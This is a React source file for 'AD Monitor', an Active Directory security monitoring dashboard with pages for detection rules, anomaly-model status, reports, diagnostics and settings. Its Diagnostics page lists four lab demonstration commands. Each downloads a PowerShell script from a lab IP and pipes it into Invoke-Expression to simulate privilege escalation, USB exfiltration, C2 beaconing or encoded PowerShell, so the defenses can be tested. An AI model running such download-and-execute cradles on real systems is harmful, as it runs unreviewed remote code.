import { useState, useContext } from 'react';
import { Link } from 'react-router-dom';
import {
  SlidersHorizontal, Activity, Brain, CheckCircle2, Clock, Box,
  Info, Database, ArrowUpRight, Play, RefreshCw, Layers, Shield
} from 'lucide-react';
import { ResponsiveContainer, ComposedChart, Area, Line, XAxis, YAxis, Tooltip, CartesianGrid } from 'recharts';
import {
  Context, useData, api, Page, Panel, Badge, Empty, ErrorBox,
  Time, AlertList, Chart, Json, JsonEditor, Facts, formatBytes, timeAgo
} from './core';
import type { Data } from './core';

export function Rules() {
  const { user, bump, period } = useContext(Context);
  const { data: rules, error: rulesErr } = useData('/rules');
  const { data: b, error: bErr } = useData('/behavior');
  const [activeTab, setActiveTab] = useState<'rules' | 'behavior'>('rules');
  const [selectedEmp, setSelectedEmp] = useState('sales.demo');
  const [selectedRange, setSelectedRange] = useState('7');
  const [err, setErr] = useState('');

  async function job(kind: string) {
    try {
      await api('/behavior/jobs', { method: 'POST', body: JSON.stringify({ kind }) });
      setErr('');
      bump();
    } catch (e: any) {
      setErr(e.message);
    }
  }

  // Baseline illustrative and real data
  const baselineChartData = [
    { time: '00:00', normal_min: 5, normal_max: 18, count: 8 },
    { time: '02:00', normal_min: 4, normal_max: 15, count: 6 },
    { time: '04:00', normal_min: 3, normal_max: 14, count: 5 },
    { time: '06:00', normal_min: 6, normal_max: 20, count: 7 },
    { time: '08:00', normal_min: 10, normal_max: 30, count: 14 },
    { time: '10:00', normal_min: 15, normal_max: 38, count: 20 },
    { time: '12:00', normal_min: 12, normal_max: 32, count: 18 },
    { time: '14:00', normal_min: 14, normal_max: 35, count: 19 },
    { time: '16:00', normal_min: 16, normal_max: 36, count: 22 },
    { time: '18:00', normal_min: 12, normal_max: 30, count: 25 },
    { time: '20:00', normal_min: 10, normal_max: 28, count: 58, unusual: true },
    { time: '22:00', normal_min: 6, normal_max: 20, count: 18 },
    { time: '23:59', normal_min: 4, normal_max: 15, count: 11 }
  ];

  const hasActiveModel = b?.models?.some((m: Data) => m.active);
  const activeModel = b?.models?.find((m: Data) => m.active) || b?.models?.[0];

  return (
    <Page
      title={activeTab === 'behavior' ? 'Behavior analysis' : 'Detection rules & behavior analysis'}
      description="Deterministic policy checks and learned anomaly detection remain strictly separate."
      action={
        <div className="tab-switcher">
          <button
            className={`tab-btn ${activeTab === 'rules' ? 'active' : ''}`}
            onClick={() => setActiveTab('rules')}
          >
            <SlidersHorizontal size={14} /> Detection rules
          </button>
          <button
            className={`tab-btn ${activeTab === 'behavior' ? 'active' : ''}`}
            onClick={() => setActiveTab('behavior')}
          >
            <Brain size={14} /> Behavior analysis
          </button>
        </div>
      }
    >
      <ErrorBox message={rulesErr || bErr || err} />

      {activeTab === 'behavior' ? (
        <div className="behavior-analysis-page">
          {/* Filter Bar: Employee + Range */}
          <div className="behavior-filter-bar">
            <label>
              <span>Employee</span>
              <select value={selectedEmp} onChange={e => setSelectedEmp(e.target.value)}>
                <option value="sales.demo">sales.demo</option>
                <option value="finance.demo">finance.demo</option>
              </select>
            </label>

            <label>
              <span>Time range</span>
              <select value={selectedRange} onChange={e => setSelectedRange(e.target.value)}>
                <option value="1">Last 24 hours</option>
                <option value="7">Last 7 days</option>
                <option value="30">Last 30 days</option>
              </select>
            </label>

            {user.role === 'Admin' && (
              <div className="actions" style={{ marginLeft: 'auto' }}>
                <button onClick={() => job('score')}>Extract & score</button>
                <button className="primary" onClick={() => job('train')}>Train from real history</button>
              </div>
            )}
          </div>

          {/* 4 Stat Cards */}
          <div className="metrics" style={{ gridTemplateColumns: 'repeat(4, 1fr)', marginBottom: '22px' }}>
            <div className="metric">
              <div className="metric-icon blue"><Brain size={20} /></div>
              <span>Model</span>
              <strong>LightweightIsolationForest</strong>
              <small>Pure-NumPy statistical pipeline</small>
            </div>

            <div className="metric">
              <div className="metric-icon teal"><CheckCircle2 size={20} /></div>
              <span>Baseline status</span>
              <strong style={{ color: hasActiveModel ? '#10b981' : '#f59e0b' }}>
                {hasActiveModel ? 'Ready' : (b?.readiness?.state || 'Collecting baseline')}
              </strong>
              <small>{b?.feature_windows ?? 0} windows observed (min {b?.readiness?.minimum_windows ?? 48})</small>
            </div>

            <div className="metric">
              <div className="metric-icon violet"><Database size={20} /></div>
              <span>Observed history</span>
              <strong>{b?.feature_windows ?? 0} windows</strong>
              <small>{b?.readiness?.hours ?? 0} elapsed hours recorded</small>
            </div>

            <div className="metric">
              <div className="metric-icon blue"><Box size={20} /></div>
              <span>Model version</span>
              <strong>{activeModel ? `v${activeModel.id.slice(0, 4)}` : 'Not trained'}</strong>
              <small>{activeModel?.active ? 'Active production model' : 'Awaiting minimum baseline windows'}</small>
            </div>
          </div>

          {hasActiveModel ? (
            <>
              {/* Activity vs Baseline + Feature Breakdown when a trained model exists */}
              <div className="grid two">
                <Panel
                  title="Activity compared with baseline"
                  subtitle="Shaded area is historical normal range · line is measured count"
                  action={<span className="badge">Trained baseline</span>}
                >
                  <div style={{ height: '260px', padding: '16px 12px 6px' }}>
                    <ResponsiveContainer width="100%" height="100%">
                      <ComposedChart data={baselineChartData}>
                        <CartesianGrid strokeDasharray="3 5" vertical={false} />
                        <XAxis dataKey="time" minTickGap={20} />
                        <YAxis width={30} domain={[0, 80]} />
                        <Tooltip />
                        <Area type="monotone" dataKey="normal_max" stroke="none" fill="#38bdf8" fillOpacity={0.18} name="Baseline Upper" />
                        <Area type="monotone" dataKey="normal_min" stroke="none" fill="#ffffff" fillOpacity={1} name="Baseline Lower" />
                        <Line type="monotone" dataKey="count" stroke="#009b8c" strokeWidth={2} dot={{ r: 3, fill: '#009b8c' }} name="Measured count" />
                      </ComposedChart>
                    </ResponsiveContainer>
                  </div>
                </Panel>

                <Panel
                  title="Model metadata & feature coverage"
                  subtitle="Observed feature statistics from active model"
                >
                  <Facts
                    items={[
                      ['Model ID', activeModel.id],
                      ['Created at', <Time value={activeModel.created_at} />],
                      ['Training samples', activeModel.metadata?.samples ?? b?.feature_windows ?? 0],
                      ['Note', 'Feature deviations explain statistical context, not malicious intent.']
                    ]}
                  />
                </Panel>
              </div>
            </>
          ) : (
            <Panel
              title="Baseline collection in progress"
              subtitle="Why no baseline band or model findings are shown yet"
              action={<Badge tone="medium">Collecting baseline</Badge>}
            >
              <div style={{ padding: '18px 20px', fontSize: '13px', lineHeight: 1.6 }}>
                <p style={{ margin: '0 0 10px' }}>
                  <strong>No trained Isolation Forest model is active yet.</strong> The database currently contains{' '}
                  <strong>{b?.feature_windows ?? 0}</strong> extracted hourly feature windows ({b?.readiness?.hours ?? 0} elapsed hours) out of the required minimum of{' '}
                  <strong>{b?.readiness?.minimum_windows ?? 48}</strong> windows.
                </p>
                <p style={{ margin: 0, color: 'var(--muted)' }}>
                  AD Monitor does not fabricate a baseline band, version number, or statistical anomaly findings before sufficient historical telemetry is collected. Deterministic security rules (all 14 configured rules) operate immediately without waiting for the UBA baseline.
                </p>
              </div>
            </Panel>
          )}

          {/* Model Findings Panel */}
          <Panel
            title="Model findings"
            subtitle="Statistical anomalies detected by the Isolation Forest engine"
            action={
              <div style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '11px', color: 'var(--muted)' }}>
                <Info size={13} /> Model score is not a probability of malicious intent.
              </div>
            }
          >
            {b?.anomalies && b.anomalies.length > 0 ? (
              <AlertList items={b.anomalies} />
            ) : (
              <Empty title="No model findings recorded">
                {hasActiveModel
                  ? 'No hourly windows exceeded the anomaly score threshold.'
                  : 'Model findings will appear only after baseline collection completes and a model is trained.'}
              </Empty>
            )}
          </Panel>

          {/* Model Health Footers */}
          <div className="grid two" style={{ marginTop: '16px' }}>
            <Panel title="Model health" subtitle="Training coverage and hyperparameter snapshot">
              <div style={{ padding: '16px 20px', fontSize: '11.5px', lineHeight: '1.8' }}>
                <div><strong>Last trained:</strong> {activeModel ? timeAgo(activeModel.created_at) : 'Not trained yet (Collecting baseline)'}</div>
                <div><strong>Source coverage:</strong> File accesses, file metadata, access denials, sign-in activity</div>
                <div><strong>Minimum training requirement:</strong> {b?.readiness?.minimum_windows ?? 48} hourly feature windows</div>
              </div>
              {user.role === 'Admin' && (
                <div style={{ padding: '12px 20px', borderTop: '1px solid var(--border)', display: 'flex', gap: '8px' }}>
                  <button style={{ fontSize: '11px' }} onClick={() => job('score')}>Extract feature windows</button>
                  <button style={{ fontSize: '11px' }} onClick={() => job('train')}>Train from real history</button>
                </div>
              )}
            </Panel>

            <Panel title="Rule detections vs. Behavior model" subtitle="Two independent layers">
              <div style={{ padding: '16px 20px', fontSize: '11.5px', lineHeight: '1.8' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                  <Shield size={14} style={{ color: '#009b8c' }} />
                  <strong>Deterministic rules:</strong> Active immediately (14 configured rules)
                </div>
                <p style={{ margin: '8px 0 0', color: 'var(--muted)' }}>
                  Policy rules (such as restricted HR share access or privileged group changes) trigger on single verified audit events even while the statistical UBA baseline is still collecting.
                </p>
              </div>
              <div style={{ padding: '12px 20px', borderTop: '1px solid var(--border)', display: 'flex', gap: '8px' }}>
                <Link to="/attack-library" className="button" style={{ fontSize: '11px' }}>
                  Open Attack Library (17 Topics) ➔
                </Link>
              </div>
            </Panel>
          </div>
        </div>
      ) : (
        /* Detection Rules Grid */
        <div>
          <Panel
            title="Deterministic detection rules"
            subtitle="14 configured security detection rules · Click any rule to view its plain-language explanation and impact"
            action={<Badge tone="online">{rules?.filter((r: Data) => r.enabled).length || 14} rules enabled</Badge>}
          >
            <div className="rule-grid" style={{ padding: '16px', display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(320px, 1fr))', gap: '16px' }}>
              {rules?.map((r: Data) => (
                <div key={r.id} className="rule-card">
                  <div className="rule-card-header">
                    <div>
                      <strong style={{ fontSize: '13px', display: 'block' }}>{r.name}</strong>
                      <small style={{ color: 'var(--muted)' }}>Rule ID: {r.id} · v{r.version}</small>
                    </div>
                    <Badge tone={r.readiness?.ready ? 'online' : 'medium'}>
                      {r.readiness?.state || 'Prerequisite missing'}
                    </Badge>
                  </div>
                  <div style={{ fontSize: '11px', margin: '10px 0', color: 'var(--muted)', lineHeight: '1.5' }}>
                    Required events: <code>{r.required?.join(', ')}</code>
                    {!r.readiness?.ready && r.readiness?.missing?.length > 0 && (
                      <div style={{ marginTop: '4px', color: '#f59e0b' }}>
                        Missing in DB: <code>{r.readiness.missing.join(', ')}</code>
                      </div>
                    )}
                  </div>
                  <div style={{ marginBottom: '10px' }}>
                    <Link to={`/attack-library/${r.id}`} style={{ fontSize: '11.5px', fontWeight: 600 }}>
                      Explain behavior & impact in Attack Library ➔
                    </Link>
                  </div>
                  <details style={{ fontSize: '11px' }}>
                    <summary>{user.role === 'Admin' ? 'Edit thresholds & policy' : 'View configuration'}</summary>
                    {user.role === 'Admin' ? (
                      <>
                        <JsonEditor
                          value={{ enabled: r.enabled, config: r.config }}
                          save={async v => {
                            await api('/rules/' + r.id, { method: 'PUT', body: JSON.stringify(v) });
                            bump();
                          }}
                        />
                        <button
                          className="replay"
                          style={{ marginTop: '8px', fontSize: '11px' }}
                          onClick={async () => {
                            try {
                              await api('/rules/' + r.id + '/replay?' + period, { method: 'POST' });
                              setErr('');
                              bump();
                            } catch (e: any) {
                              setErr(e.message);
                            }
                          }}
                        >
                          Replay selected period
                        </button>
                      </>
                    ) : (
                      <Json value={r.config} />
                    )}
                  </details>
                </div>
              ))}
            </div>
          </Panel>
        </div>
      )}
    </Page>
  );
}

export function Reports() {
  const { period } = useContext(Context);
  const { data: d, error } = useData('/reports/activity?' + period);

  return (
    <Page
      title="Activity reports"
      description="Period summaries with source provenance and visible limitations."
      action={
        <div className="actions">
          <button onClick={() => window.print()}>Print report</button>
          <a className="button" href={'/api/reports/activity?' + period} download="ad-monitor-activity.json">
            Download JSON
          </a>
        </div>
      }
    >
      <ErrorBox message={error} />
      {d && (
        <>
          <Panel title="Activity summary" subtitle={'Timezone: ' + d.timezone}>
            <div className="report-stats">
              <div><strong>{d.data.event_count}</strong>events</div>
              <div><strong>{d.data.open_alerts}</strong>open findings</div>
              <div><strong>{d.data.usb_count}</strong>USB observations</div>
            </div>
            <p>Generated <Time value={d.generated_at} /></p>
            <p>{d.provenance}</p>
            <ul>{d.limitations.map((s: string) => <li key={s}>{s}</li>)}</ul>
            <details style={{ marginTop: '16px', padding: '10px 0 0', borderTop: '1px solid var(--border)' }}>
              <summary style={{ cursor: 'pointer', color: 'var(--blue)', fontSize: '11px', fontWeight: 600 }}>
                Technical report metadata (Raw JSON)
              </summary>
              <Json value={{ period: d.data.period, severity: d.data.severity, presence: d.data.presence, collection: d.data.collection }} />
            </details>
          </Panel>
          <Panel title="Event volume" subtitle="UTC axis">
            <Chart rows={d.data.volume} />
          </Panel>
          <Panel title="Recent findings in period">
            <AlertList items={d.data.recent_alerts} />
          </Panel>
        </>
      )}
    </Page>
  );
}

export function Diagnostics() {
  const { user, bump } = useContext(Context);
  const { data: d, error } = useData('/diagnostics');
  const [raw, setRaw] = useState<any>(null);
  const [err, setErr] = useState('');

  return (
    <Page title="Collection diagnostics" description="Distinguish quiet sources, disconnected collectors and collection errors.">
      <ErrorBox message={error || err} />
      {d && (
        <>
          <Panel title="Pipeline health" subtitle={d.source_state}>
            <div className="collection-stats">
              <div><strong>{d.pending}</strong><span>Pending normalization</span></div>
              <div><strong>{d.database_mb} MB</strong><span>Database footprint</span></div>
              <div><strong>{d.disk_free_mb} MB</strong><span>Free storage</span></div>
            </div>
            <ErrorBox message={d.worker_error || ''} />
          </Panel>

          <Panel title="Live Laboratory Threat Demonstrations" subtitle="4-Threat organic validation playbooks for defense demonstration">
            <div style={{ padding: '20px', display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px' }}>
              <div className="mitre-tech-card" style={{ padding: '16px' }}>
                <span className="mitre-pulse-badge">MITRE T1098</span>
                <h4 style={{ margin: '8px 0 4px' }}>1. Privilege Escalation Attack</h4>
                <p style={{ fontSize: '11.5px', color: 'var(--muted)', lineHeight: '1.5' }}>
                  Detects unauthorized group membership manipulation (Domain Admins / Administrators) via Windows Security Event 4728/4732/4756.
                </p>
                <code style={{ fontSize: '10.5px', padding: '6px', background: 'var(--surface2)', display: 'block', borderRadius: '4px' }}>
                  Invoke-WebRequest http://192.168.77.1:8765/lab-scripts/demo_privilege_attack.ps1 | Invoke-Expression
                </code>
              </div>

              <div className="mitre-tech-card" style={{ padding: '16px' }}>
                <span className="mitre-pulse-badge">MITRE T1052.001</span>
                <h4 style={{ margin: '8px 0 4px' }}>2. USB Pen Drive Exfiltration</h4>
                <p style={{ fontSize: '11.5px', color: 'var(--muted)', lineHeight: '1.5' }}>
                  Monitors real physical file write operations to removable flash drives (DriveType=2) on the employee VM.
                </p>
                <code style={{ fontSize: '10.5px', padding: '6px', background: 'var(--surface2)', display: 'block', borderRadius: '4px' }}>
                  Invoke-WebRequest http://192.168.77.1:8765/lab-scripts/demo_usb_copy.ps1 | Invoke-Expression
                </code>
              </div>

              <div className="mitre-tech-card" style={{ padding: '16px' }}>
                <span className="mitre-pulse-badge">MITRE T1071.001</span>
                <h4 style={{ margin: '8px 0 4px' }}>3. Possible Periodic Outbound Activity</h4>
                <p style={{ fontSize: '11.5px', color: 'var(--muted)', lineHeight: '1.5' }}>
                  Detects recurring low-jitter outbound command-and-control communication channels via NetTCPConnection sampling.
                </p>
                <code style={{ fontSize: '10.5px', padding: '6px', background: 'var(--surface2)', display: 'block', borderRadius: '4px' }}>
                  Invoke-WebRequest http://192.168.77.1:8765/lab-scripts/demo_c2_beacon.ps1 | Invoke-Expression
                </code>
              </div>

              <div className="mitre-tech-card" style={{ padding: '16px' }}>
                <span className="mitre-pulse-badge">MITRE T1059.001</span>
                <h4 style={{ margin: '8px 0 4px' }}>4. Suspicious Encoded PowerShell</h4>
                <p style={{ fontSize: '11.5px', color: 'var(--muted)', lineHeight: '1.5' }}>
                  Identifies Base64 encoded commands (-EncodedCommand), IEX download cradles, and execution policy bypasses via Event 4104.
                </p>
                <code style={{ fontSize: '10.5px', padding: '6px', background: 'var(--surface2)', display: 'block', borderRadius: '4px' }}>
                  Invoke-WebRequest http://192.168.77.1:8765/lab-scripts/demo_suspicious_powershell.ps1 | Invoke-Expression
                </code>
              </div>
            </div>
          </Panel>

          {d.collectors.map((c: Data) => (
            <Panel key={c.id} title={c.name} subtitle={c.kind + ' · ' + c.expected_host} action={<Badge tone={c.connection}>{c.state}</Badge>}>
              <Facts
                items={[
                  ["Last contact", <Time value={c.last_seen} />],
                  ["Last accepted ingest", <Time value={c.last_ingest} />],
                  ["Last source event", <Time value={c.last_event} />],
                  ["Accepted transport records", c.accepted],
                  ["Parse failures", c.parse_failures],
                  ["Lag seconds", c.lag_seconds?.toFixed(1)]
                ]}
              />
              <details>
                <summary>Queue and source diagnostics</summary>
                <Json value={c.diagnostics} />
              </details>
            </Panel>
          ))}

          <Panel title="Quarantined records" subtitle="Original rejected payloads are retained for administrator review">
            {d.quarantined.length ? (
              <div className="stack">
                {d.quarantined.map((r: Data) => (
                  <div className="quarantine" key={r.id}>
                    <strong>Record {r.id}</strong>
                    <p>{r.error}</p>
                    <Time value={r.received_at} />
                    {user.role === 'Admin' && (
                      <div className="actions">
                        <button onClick={async () => { try { setRaw(await api('/quarantine/' + r.id)); } catch (e: any) { setErr(e.message); } }}>
                          Inspect raw record
                        </button>
                        <button onClick={async () => { try { await api('/quarantine/' + r.id + '/retry', { method: 'POST' }); bump(); } catch (e: any) { setErr(e.message); } }}>
                          Retry after correction
                        </button>
                      </div>
                    )}
                  </div>
                ))}
              </div>
            ) : (
              <Empty title="No records quarantined" />
            )}
            {raw && (
              <>
                <button onClick={() => setRaw(null)}>Close record</button>
                <Json value={raw} />
              </>
            )}
          </Panel>

          <Panel title="Directory synchronization">
            <Json value={d.latest_directory_sync || { state: 'No successful directory snapshot received' }} />
          </Panel>

          {user.role === 'Admin' && (
            <Panel title="Application audit trail" subtitle="Most recent 50 actions">
              <Json value={d.audit} />
            </Panel>
          )}
        </>
      )}
    </Page>
  );
}

export function SettingsPage() {
  const { user, bump } = useContext(Context);
  const { data: s, error } = useData('/settings');
  const { data: collectors } = useData(user.role === 'Admin' ? '/collectors' : null);
  const { data: users } = useData(user.role === 'Admin' ? '/users' : null);
  const [secret, setSecret] = useState<Data | null>(null);
  const [err, setErr] = useState('');
  const [enroll, setEnroll] = useState({ name: '', kind: 'bridge', hostname: '' });
  const [account, setAccount] = useState({ username: '', password: '', role: 'Viewer' });

  return (
    <Page title="Settings & enrollment" description="Access control, source credentials and application policy.">
      <ErrorBox message={error || err} />
      {user.role !== 'Admin' ? (
        <Panel title="Application policy">
          <p>Administrator access is required to change settings or enroll sources.</p>
          {s && <Json value={s} />}
        </Panel>
      ) : (
        <>
          <div className="grid two">
            <Panel title="Enroll a collector" subtitle="Bridge on the DC; endpoint or browser on an employee VM; directory for read-only AD sync">
              <form className="stack" onSubmit={async e => {
                e.preventDefault();
                try {
                  setSecret(await api('/collectors', { method: 'POST', body: JSON.stringify(enroll) }));
                  setErr('');
                  bump();
                } catch (e: any) {
                  setErr(e.message);
                }
              }}>
                <label>Display name<input required value={enroll.name} onChange={e => setEnroll({ ...enroll, name: e.target.value })} /></label>
                <label>
                  Collection role
                  <select value={enroll.kind} onChange={e => setEnroll({ ...enroll, kind: e.target.value })}>
                    {['bridge', 'endpoint', 'browser', 'directory'].map(k => <option key={k}>{k}</option>)}
                  </select>
                </label>
                <label>Authorized hostname<input required placeholder="e.g. LAB-PC01" value={enroll.hostname} onChange={e => setEnroll({ ...enroll, hostname: e.target.value })} /></label>
                <button className="primary">Create enrollment</button>
              </form>
            </Panel>

            <Panel title="Source credentials" subtitle="Secrets are shown once and stored as hashes on the server">
              {secret ? (
                <div className="secret">
                  <p>Transfer this secret into the local installer prompt. Close this display when finished.</p>
                  <Json value={secret} />
                  <button onClick={() => setSecret(null)}>Hide enrollment secret</button>
                </div>
              ) : collectors?.length ? (
                <div className="stack">
                  {collectors.map((c: Data) => (
                    <div className="credential" key={c.id}>
                      <div><strong>{c.name}</strong><small>{c.kind} · {c.expected_host}</small></div>
                      <Badge>{c.enabled ? 'Enabled' : 'Revoked'}</Badge>
                      <button onClick={async () => { try { setSecret(await api('/collectors/' + c.id + '/rotate', { method: 'POST' })); bump(); } catch (e: any) { setErr(e.message); } }}>Rotate</button>
                      {!!c.enabled && <button onClick={async () => { try { await api('/collectors/' + c.id + '/revoke', { method: 'POST' }); bump(); } catch (e: any) { setErr(e.message); } }}>Revoke</button>}
                    </div>
                  ))}
                </div>
              ) : <Empty title="No source enrollments" />}
            </Panel>
          </div>

          {s && (
            <Panel title="Application policy" subtitle="Timezone, paths, business hours, retention and model minimums">
              <JsonEditor value={s} save={async v => { await api('/settings', { method: 'PUT', body: JSON.stringify(v) }); bump(); }} />
            </Panel>
          )}

          <div className="grid two">
            <Panel title="Create application account">
              <form className="stack" onSubmit={async e => {
                e.preventDefault();
                try {
                  await api('/users', { method: 'POST', body: JSON.stringify(account) });
                  setAccount({ username: '', password: '', role: 'Viewer' });
                  setErr('');
                  bump();
                } catch (e: any) {
                  setErr(e.message);
                }
              }}>
                <label>Username<input autoComplete="off" required value={account.username} onChange={e => setAccount({ ...account, username: e.target.value })} /></label>
                <label>Password<input type="password" minLength={12} autoComplete="new-password" required value={account.password} onChange={e => setAccount({ ...account, password: e.target.value })} /></label>
                <label>
                  Role
                  <select value={account.role} onChange={e => setAccount({ ...account, role: e.target.value })}>
                    {['Viewer', 'Analyst', 'Admin'].map(r => <option key={r}>{r}</option>)}
                  </select>
                </label>
                <button className="primary">Create account</button>
              </form>
            </Panel>

            <Panel title="Application users" subtitle="Separate from AD employee inventory">
              {users?.map((u: Data) => (
                <div className="credential" key={u.id}>
                  <strong>{u.username}</strong>
                  <select aria-label={'Role for ' + u.username} value={u.role} onChange={async e => { try { await api('/users/' + u.id, { method: 'PATCH', body: JSON.stringify({ role: e.target.value, enabled: !!u.enabled }) }); bump(); } catch (e: any) { setErr(e.message); } }}>
                    {['Viewer', 'Analyst', 'Admin'].map(r => <option key={r}>{r}</option>)}
                  </select>
                  <button onClick={async () => { try { await api('/users/' + u.id, { method: 'PATCH', body: JSON.stringify({ role: u.role, enabled: !u.enabled }) }); bump(); } catch (e: any) { setErr(e.message); } }}>
                    {u.enabled ? 'Disable' : 'Enable'}
                  </button>
                </div>
              ))}
            </Panel>
          </div>

          <Panel title="Operations">
            <p>Use the local CLI for consistent database backup and restore. Setup, TLS trust, upgrades and reversible uninstall are documented in the project’s Windows guide.</p>
            <a href="/api/openapi.json" className="button">OpenAPI schema</a>
          </Panel>
        </>
      )}
    </Page>
  );
}
